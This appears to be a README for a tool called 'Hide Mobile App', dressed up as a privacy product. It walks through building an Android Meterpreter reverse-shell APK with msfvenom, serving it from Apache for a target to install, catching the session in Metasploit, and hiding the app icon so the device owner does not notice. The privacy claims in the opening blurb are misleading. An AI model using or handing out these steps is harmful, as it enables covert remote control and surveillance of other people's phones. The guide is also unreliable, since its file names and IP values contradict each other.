# Hide-Mobile-App
"Hide Mobile App" maximizes Kali Linux and msfvenom capabilities to deploy custom payloads covertly onto target mobile devices. Seamlessly integrated into the Kali environment, it ensures the utmost privacy by encrypting sensitive data. Effortlessly secure your information with "Hide Mobile App" on Kali Linux.

## Table of Content

1. [Generate Apk File](#generate-apk-file)
2. [Check Server](#check-server)
3. [Accessibility](#accessibility)
4. [Installation](#installation)
5. [Permissions](#permissions)
6. [Accessing Device](#accessing-device)






## Generate Apk File
`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9999 R > ./mobileApp.apk`
This command utilizes `msfvenom`, a Metasploit payload generator, to create a custom Android application (`.apk` file) embedded with a Meterpreter reverse TCP payload.

Breaking down the command: <br>
`-p android/meterpreter/reverse_tcp` Specifies the payload to be used. In this case, it's a Meterpreter payload designed for Android devices that establishes a reverse TCP connection back to the attacker's machine.

`LHOST=192.168.0.0` Sets the IP address of the attacker's machine (the listener host) to which the Meterpreter session will connect.

`LPORT=9999` Sets the port on the attacker's machine (the listener port) where the Meterpreter session will connect.

`R > ./mobileApp.apk` Redirects the generated payload to a file named `mobileApp.apk` in the current directory.

## Check Server

Check whether your apache server is running or not.
`systemctl status apache2`
If the status is active (running), then okay. If not, use this command below to activate your apache2 server.
`sudo systemctl start apache2`
Optionally, you can also enable Apache2 to start automatically on boot by running:
`sudo systemctl enable apache2`
To verify that Apache2 is running, you can use:
`sudo systemctl status apache2`
So, we have our web application server running.

## Accessibility

Making the file to be easily accessible by other machine/system/device.
`sudo mv ./hacker.apk /var/www/html/`
`cd /var/www/html/`

## Installation

Open your favourate browser on the targeted device and type the ip address followed by forward slash hacker.apk. For example if the ip addr is 192.168.0.0:
➡ 192.168.0.0/hacker.apk

## Permissions

After this, allow the permission to install the apk in the device. Enable all the permissions if needed from the settings>apps>app_name

## Accessing Device

Open Metasploit Framework in your Linux terminal. Type the command in your linux terminal to start Metasploit Framework.
`msfconsole`

Type this command to use the specific exploit:
`use exploit/multi/handler`

See Options:
`show options`

Set payload using this command:
`set payload android/meterpreter/reverse_tcp`

See Options:
`show options`

Set LHOST by the ip addr of the listener machine i.e. in our case, Kali Linux:
`set LHOST 192.168.0.0` ➡ Replace 192.168.0.0 with your machine ip addr.

Set LPORT:
`set LPORT 9999`

After this, run it by using one of these commands:
`exploit` or `run`

As soon as yopu open the installed apk in the targeted device, it will create a meterpreter session in your terminal.

Type `help` to see all the available options and commands that you can pass.

Retrieves basic system information in Meterpreter like OS, architecture, language, and uptime, aiding attackers in understanding target systems for subsequent actions:
`sysinfo`

Now making the activity that actually try to hide the mobile application from appearing:
`hide_app_icon`

You can actually go under settings and once you are in settings, you can go on for applications or apps, and then you will be able to see the apps that are running in your environment. <br> So of course, this is the only way the user could detect that the mobile application is running.

